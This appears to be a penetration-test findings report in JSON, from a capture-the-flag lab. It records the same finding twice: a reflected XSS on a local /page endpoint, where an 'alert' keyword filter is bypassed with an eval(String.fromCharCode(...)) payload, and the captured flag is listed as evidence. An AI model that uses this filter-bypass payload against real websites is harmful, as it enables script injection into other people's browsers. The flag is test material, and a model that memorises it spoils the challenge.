@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-14T15:00:09.441227+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "a8d7749e-2102-4d57-8d6a-ef478de9b341",
+      "timestamp": "2026-04-14T15:00:09.441094+00:00",
+      "title": "Reflected XSS with alert filter bypass via String.fromCharCode",
+      "severity": "critical",
+      "target": "http://172.17.0.1:51047/page",
+      "description": "The /page endpoint reflects the 'name' parameter without proper sanitization. The application filters the word 'alert' but can be bypassed using String.fromCharCode() encoding to execute arbitrary JavaScript.",
+      "evidence": "flag{cc21e4bb-7e26-4326-ba5a-052b6b1092e1}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET /page?name=<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>",
+        "expected": "XSS alert with 'XSS' string triggers, revealing the flag"
+      }
+    },
+    {
+      "id": "2b943d15-64d5-4ba1-a397-9384c2006cde",
+      "timestamp": "2026-04-14T15:00:09.492531+00:00",
+      "title": "Reflected XSS with alert filter bypass via String.fromCharCode",
+      "severity": "critical",
+      "target": "http://172.17.0.1:51047/page",
+      "description": "The /page endpoint reflects the 'name' parameter without proper sanitization. The application filters the word 'alert' but can be bypassed using String.fromCharCode() encoding to execute arbitrary JavaScript.",
+      "evidence": "flag{cc21e4bb-7e26-4326-ba5a-052b6b1092e1}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET /page?name=<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>",
+        "expected": "XSS alert with 'XSS' string triggers, revealing the flag"
+      }
+    }
+  ],
+  "diagrams": []
+}
